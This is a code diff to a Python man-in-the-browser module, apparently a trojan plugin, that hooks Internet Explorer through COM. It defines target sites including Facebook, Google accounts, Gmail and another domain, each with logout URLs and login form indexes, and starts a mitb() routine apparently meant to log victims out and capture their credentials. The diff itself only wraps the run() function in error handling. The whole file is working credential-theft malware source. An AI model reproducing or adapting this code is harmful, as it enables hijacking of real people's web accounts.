@@ -70,38 +70,42 @@ def mitb(windows):
       time.sleep(0) 
 
 def run(**args):
- print "Screwing Internet Explorer!!!"
- global target_sites
- target_sites = {}
- target_sites["www.facebook.com"] = \
+ try:
+   print "Screwing Internet Explorer!!!"
+   global target_sites
+   target_sites = {}
+   target_sites["www.facebook.com"] = \
      {"logout_url"      : None, 
       "logout_form"     : "logout_form", 
       "login_form_index": 0, 
       "owned"           : False} 
   
 
- target_sites["upes.winnou.net"] = \
+   target_sites["upes.winnou.net"] = \
      {"logout_url"      : None, 
       "logout_form"     : "logout_form", 
       "login_form_index": 0, 
       "owned"           : False} 
 
 
- target_sites["accounts.google.com"]    = \
+   target_sites["accounts.google.com"]    = \
      {"logout_url"       : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail", 
       "logout_form"      : None, 
       "login_form_index" : 0, 
       "owned"            : False} 
 
 # Use same target for multiple gmail domains
- target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
- target_sites["mail.google.com"] = target_sites["accounts.google.com"]
- target_sites["m.facebook.com"] = target_sites["www.facebook.com"]
- clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
- windows = win32com.client.Dispatch(clsid)
+   target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
+   target_sites["mail.google.com"] = target_sites["accounts.google.com"]
+   target_sites["m.facebook.com"] = target_sites["www.facebook.com"]
+   clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
+   windows = win32com.client.Dispatch(clsid)
 
- mitb(windows)
- return str("started")
+   mitb(windows)
+   return str("started")
+ except:
+    print "Quit"
+    return str("quit")
  
 
 run()
